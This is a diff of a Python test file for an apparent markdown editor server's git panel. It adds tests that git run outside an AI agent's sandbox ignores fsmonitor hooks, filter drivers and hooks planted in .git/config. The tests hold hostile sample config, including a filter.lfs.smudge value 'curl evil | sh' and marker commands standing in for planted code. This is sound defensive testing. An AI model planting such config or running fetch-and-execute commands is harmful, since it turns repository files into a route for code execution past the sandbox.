@@ -172,7 +172,7 @@ def test_root_in_a_subfolder_counts_changes_outside(srv, tmp_path):
     assert changes(res) == {"a.md": ("M", None), "new.md": ("U", None), "in.py": ("A", None), "out.md": ("D", None)}
     assert res["outside"] == 5, "src/x.py, src/u.py, top.txt and one side of each rename"
     commit(repo, "everything")
-    assert status_of(srv) == {"repo": True, "base": status_of(srv)["base"], "files": [], "outside": 0}
+    assert status_of(srv) == {"repo": True, "base": status_of(srv)["base"], "files": [], "outside": 0, "nested": 0}
 
 
 def test_branch_base_shows_everything_since_the_default_branch(srv, tmp_path):
@@ -294,3 +294,75 @@ def test_discard_refusals(srv, tmp_path):
     assert discard(srv, path="sub")[0] == 400, "not a whole folder"
     assert discard(srv, path=".git/config")[0] == 400
     assert (repo / "a.txt").read_text() == "a2\n" and (repo / "sub/b.txt").read_text() == "b2\n"
+
+
+# ---------------------------------------------------------------- nested repositories
+
+def test_nested_repositories_are_not_listed_as_changes(srv, tmp_path):
+    """An untracked repository inside this one (a cloned dependency, a linked worktree) is one
+    `dir/` entry to git status, which the panel could neither open nor discard: it is counted."""
+    repo = make_repo(tmp_path / "repo", {"a.txt": "a\n"})
+    make_repo(repo / "vendor" / "lib", {"x.txt": "x\n"})
+    git(repo, "worktree", "add", "-q", "-b", "side", str(repo / "wt"))
+    write(repo, {"a.txt": "a2\n", "new.txt": "n\n"})
+    open_root(srv, repo)
+    res = status_of(srv)
+    assert changes(res) == {"a.txt": ("M", None), "new.txt": ("U", None)}
+    assert res["nested"] == 2
+    git(repo, "checkout", "-q", "-b", "feature")
+    res = status_of(srv, "branch")
+    assert res["base"]["mode"] == "branch" and changes(res) == {"a.txt": ("M", None), "new.txt": ("U", None)}
+    assert res["nested"] == 2
+
+
+# ---------------------------------------------------------------- commands named by the repository
+
+def test_git_runs_no_command_that_the_repositorys_config_names(srv, tmp_path):
+    """md-editor runs git outside the sandbox that Claude runs in, and the sandbox can write
+    .git/config, .git/info/attributes and .git/hooks: an fsmonitor hook, filter drivers and
+    hooks must not run, whatever the page asks for."""
+    repo = make_repo(tmp_path / "repo", {"a.txt": "a\n", "b.txt": "b\n", ".gitignore": "*.log\n"})
+    git(repo, "checkout", "-q", "-b", "feature")
+    marks = tmp_path / "marks"
+    marks.mkdir()
+    git(repo, "config", "core.fsmonitor", f"touch {marks}/fsmonitor; false")
+    git(repo, "config", "filter.x.clean", f"touch {marks}/clean; cat")
+    git(repo, "config", "filter.x.smudge", f"touch {marks}/smudge; cat")
+    git(repo, "config", "filter.x.required", "true")
+    git(repo, "config", "filter.y.process", f"touch {marks}/process")
+    (repo / ".git/info/attributes").write_text("*.txt filter=x\n*.md filter=y\n")
+    hook = repo / ".git/hooks/post-checkout"
+    hook.write_text(f"#!/bin/sh\ntouch {marks}/hook\n")
+    hook.chmod(0o755)
+    write(repo, {"a.txt": "a2\n", "c.md": "c\n"})
+    open_root(srv, repo)
+    for endpoint, params in (("/api/tree", {"dir": ""}), ("/api/allfiles", {}), ("/api/search", {"q": "a"}),
+                             ("/api/search", {"q": "a", "regex": "1"}), ("/api/git/status", {"base": "head"}),
+                             ("/api/git/status", {"base": "branch"}), ("/api/git/show", {"path": "a.txt"})):
+        assert get(srv, endpoint, **params)[0] == 200, endpoint
+    assert changes(status_of(srv)) == {"a.txt": ("M", None), "c.md": ("U", None)}
+    assert discard(srv, path="a.txt")[0] == 200
+    assert (repo / "a.txt").read_text() == "a\n"
+    assert sorted(p.name for p in marks.iterdir()) == []
+    git(repo, "status")   # the check is a real one: git itself runs them
+    assert "fsmonitor" in {p.name for p in marks.iterdir()}
+
+
+def test_filter_opts_leave_git_lfs_alone(tmp_path, monkeypatch):
+    from md_collab_editor import server as S
+    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(tmp_path / "gitconfig"))
+    monkeypatch.setenv("GIT_CONFIG_NOSYSTEM", "1")
+    repo = make_repo(tmp_path / "repo")
+    assert S.filter_opts(repo) == []
+    for k, v in (("clean", "git-lfs clean -- %f"), ("smudge", "git-lfs smudge -- %f"),
+                 ("process", "git-lfs filter-process"), ("required", "true")):
+        git(repo, "config", "--file", str(tmp_path / "gitconfig"), f"filter.lfs.{k}", v)
+    assert S.filter_opts(repo) == [], "as `git lfs install` sets it up"
+    git(repo, "config", "filter.lfs.smudge", "curl evil | sh")
+    git(repo, "config", "filter.My.Driver.clean", "x")
+    opts = S.filter_opts(repo)
+    assert "filter.lfs.smudge=" in opts and "filter.lfs.required=false" in opts
+    assert "filter.My.Driver.clean=" in opts, "subsection names keep their case and dots"
+    git(repo, "config", "filter.a=b.clean", "x")
+    with pytest.raises(OSError):
+        S.filter_opts(repo)
